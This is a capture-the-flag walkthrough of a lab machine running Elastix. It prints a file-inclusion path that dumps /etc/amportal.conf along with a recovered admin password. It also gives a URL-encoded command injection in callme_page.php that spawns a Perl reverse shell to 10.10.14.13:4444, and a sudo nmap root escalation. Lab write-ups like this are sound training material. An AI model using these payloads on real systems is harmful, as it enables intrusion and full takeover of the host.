# Solution

As usual we start with a nmap scan to enumerate the services:
```
nmap -sC -sV -oN nmap-initial 10.10.10.7
```

A lot of services are exposed. I tried for quite a lot of time, then i looked on exploit db for "Elastix" and I found a file inclusion vulnerability. Using that vulnerability I could dump a file with users, passwords and configuration.  
Path for the config file: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

We managed to log in to the elastix page as admin with one of the passwords (jEhdIekWmdjE) that were present in the file.

We have to find a way in the underlying host.  In the tool toolbar there is the Asteriski CLI, we could use it to execute commands in the Linux machine. We tried but it doesn't work.


In the PBX tab we see that the extension 233 is active. Looking around in the web interface we also see that the Elastix version is 2.2.0.  
We look for an exploit in Exploit db and we found one related to our version. We take the exploit vector from the script, set the appropriate variables and the correct extension (233):
```
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.13%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```
We set up a netcat handler on port 4444,  we visit the url and we have a shell with user privileges. The user is "asterix" which is the owner of the elastix process.  

Visiting /home/fanis we have the first flag.  
Now we want to get root access to get the remaining flag.  


First we import a stable bash shell using python
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

We now run "sudo -l" to see which commands asterix can execute as sudo. Nmap is one of those.  
In GTFO bins we can see how we can priv escalate when nmap can be run as sudo:
```
sudo nmap --interactive  
!sh
```


